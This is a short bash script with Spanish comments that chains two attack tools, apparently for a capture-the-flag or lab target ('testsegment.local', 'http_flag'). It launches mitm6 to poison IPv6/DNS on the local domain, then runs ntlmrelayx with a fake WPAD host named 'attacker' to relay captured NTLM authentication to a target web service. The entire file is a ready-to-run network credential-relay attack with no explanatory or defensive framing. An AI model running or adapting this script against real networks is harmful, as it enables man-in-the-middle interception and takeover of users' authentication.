#!/bin/bash

# Lanzar mitm6
echo "[*] Iniciando mitm6"
mitm6 -d testsegment.local &

# Esperar un poco
sleep 5

# Lanzar ntlmrelayx en modo HTTP
echo "[*] Lanzando ntlmrelayx"
ntlmrelayx.py -wh attacker -t http://http_flag/ -6 --no-smb-server
